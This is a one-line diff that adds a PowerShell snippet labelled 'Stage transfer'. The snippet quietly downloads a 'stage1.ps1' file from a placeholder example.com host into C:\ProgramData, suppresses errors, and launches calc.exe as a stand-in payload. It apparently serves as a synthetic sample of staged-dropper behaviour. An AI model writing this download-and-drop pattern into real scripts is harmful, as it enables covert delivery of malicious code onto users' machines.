@@ -1,0 +1,1 @@
+<# Stage transfer #> $Stage1Url = 'https://example.com:443/stage1.ps1'; $WorkingPath = "C:\ProgramData\stage1.bin"; $StageTimeout = 67; Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-16"; Write-Output "stage 30 initialized"
